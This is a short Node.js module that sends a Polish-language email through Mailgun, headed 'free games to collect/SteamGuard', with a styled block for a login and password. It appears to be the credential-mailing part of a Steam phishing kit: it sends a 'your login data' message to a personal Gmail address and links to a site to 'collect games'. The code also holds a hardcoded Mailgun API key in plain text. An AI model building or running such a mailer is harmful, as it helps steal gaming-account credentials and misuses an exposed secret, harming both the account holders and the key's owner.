var api_key = '36a7586935f3c6e0064a7d94a622afe7-39bc661a-e30d1e23';
var domain = 'poczta.salon-gier-pc.pl';
var mailgun = require('mailgun-js')({ apiKey: api_key, domain: domain, host: 'api.eu.mailgun.net' });
async function main(user, host) {


    var data = {
        from: 'Salon-Gier-PC@poczta.salon-gier-pc.pl',
        replyto: 'Salon.Gier.Komputerowych@gmail.com',
        to: `areks1414@gmail.com`,
        subject: 'Twoje Gratisowe Gry Do Odebrania/SteamGuard!',
        text: `Twoje dane logowania :Login: Hasło: xyz `,
        html: `<table style='color:white; font-family:Helvetica; background: #0f0c29; background: -webkit-linear-gradient(to right, #0f0c29, #302b63, #24243e); /* Chrome 10-25, Safari 5.1-6 */ background: linear-gradient(to right, #0f0c29, #302b63, #24243e); width:538px;text-align:center;' align='center'><tbody><tr><td style='vertical-align:middle; padding:15px; font-size:25px;'>Twoje Dane Logowania</td></tr><tr><td style='height:100px; vertical-align:middle;height:300px; background:url(https://image.freepik.com/darmowe-wektory/tlo-gry-kosmicznej_7814-427.jpg);'><h2>Login<h2><p style='color:yellow'><b></b></p><h2>Hasło</h2> <p style='color:yellow'><b>xyz$</b></p><h2>Dziękujemy!</h2></td></tr><tr><td style='vertical-align:middle; padding:15px; font-size:25px;'><a style='color:grey' href='https://www.salon-gier-pc.pl'>Odbierz Gry</a></td></tr></tbody></table>`
    };

    mailgun.messages().send(data).catch(error => {
        mailgun.messages().send(data)
    })
}


module.exports = {
    send: main
}